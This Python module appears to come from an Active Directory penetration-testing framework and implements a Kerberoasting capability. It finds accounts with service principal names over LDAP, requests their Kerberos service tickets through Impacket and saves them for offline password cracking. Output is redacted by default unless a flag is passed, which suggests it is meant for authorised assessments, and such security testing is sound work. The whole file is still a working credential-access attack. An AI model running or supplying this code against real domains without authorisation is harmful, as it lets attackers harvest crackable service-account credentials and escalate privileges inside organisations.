"""Kerberoasting capability (Impacket-backed)."""

from __future__ import annotations

import json
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.redaction import redact
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="kerberoast",
    summary="Request TGS tickets for SPN-enabled accounts (Kerberoasting)",
    category="credential-access",
    tags=("kerberos", "tgs", "spn"),
)
class Kerberoast:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal
            from impacket.ldap import ldap as impacket_ldap
            from impacket.ldap import ldapasn1 as ldapasn1
        except ImportError as exc:
            raise RuntimeError(
                "Kerberoasting requires Impacket. Install with: pip install 'adaf-attack[kerberos]'"
            ) from exc

        if not target.username or not (target.password or target.hashes):
            raise RuntimeError("Kerberoasting requires credentials (username + password or hashes)")

        console.print(f"[bold]Kerberoast[/bold] → {target.domain} @ {target.dc_ip}")

        # Discover SPN accounts via LDAP first (reuse simple ldap3 path or Impacket)
        from ldap3 import ALL, SUBTREE, Connection, Server

        server = Server(target.dc_ip, get_info=ALL, use_ssl=target.ldaps)
        conn = Connection(
            server,
            user=target.auth_user,
            password=target.password or "",
            authentication="NTLM",
            auto_bind=True,
        )
        base_dn = server.info.other.get("defaultNamingContext", [None])[0]
        if not base_dn:
            base_dn = ",".join(f"DC={p}" for p in target.domain.split("."))

        conn.search(
            base_dn,
            "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "servicePrincipalName", "userAccountControl"],
        )

        targets = []
        for entry in conn.entries:
            sam = str(entry.sAMAccountName)
            spns = [str(s) for s in (entry.servicePrincipalName or [])]
            if spns:
                targets.append({"sam": sam, "spns": spns})
                user_id = f"USER@{sam.upper()}@{target.domain.upper()}"
                graph.add_node(user_id, "User", sam=sam, spns=spns)
                for spn in spns:
                    graph.add_edge(user_id, user_id, "HasSPN", spn=spn)

        conn.unbind()

        console.print(f"Found [cyan]{len(targets)}[/cyan] SPN-enabled accounts")

        # Request TGS tickets
        hashes = target.hashes
        lmhash = nthash = ""
        if hashes:
            parts = hashes.split(":")
            if len(parts) == 2:
                lmhash, nthash = parts
            else:
                nthash = parts[0]

        user_principal = Principal(target.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            user_principal,
            target.password or "",
            target.domain.upper(),
            lmhash,
            nthash,
            "",
            target.dc_ip,
        )

        roasted = []
        for t in targets:
            sam = t["sam"]
            # Use first SPN
            spn = t["spns"][0]
            try:
                spn_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                    spn_principal,
                    target.domain.upper(),
                    target.dc_ip,
                    tgt,
                    cipher,
                    sessionKey,
                )
                # Build hashcat / john format (simplified)
                # Full formatting would use Impacket's getUserSPNs output helpers
                ticket_blob = tgs["ticket"].prettyPrint() if hasattr(tgs.get("ticket", b""), "prettyPrint") else str(tgs)
                entry = {
                    "account": sam,
                    "spn": spn,
                    "ticket": ticket_blob,
                    "format": "impacket-raw",
                }
                roasted.append(entry)
                console.print(f"  [green]✓[/green] {sam}  ({spn})")
            except Exception as exc:  # noqa: BLE001
                console.print(f"  [red]✗[/red] {sam}  ({exc})")
                roasted.append({"account": sam, "spn": spn, "error": str(exc)})

        result = {
            "domain": target.domain,
            "count": len(roasted),
            "tickets": roasted,
        }

        redacted = redact(result, include_secrets=include_secrets)
        out_path = session.path("kerberoast.json")
        out_path.write_text(json.dumps(redacted, indent=2, default=str))
        graph.save(session.path("graph.json"))

        session.log("kerberoast.complete", count=len(roasted), include_secrets=include_secrets)
        console.print(f"Results → {out_path}")
        if not include_secrets:
            console.print("[dim]Tickets redacted. Use --include-secrets to keep them.[/dim]")
        return redacted
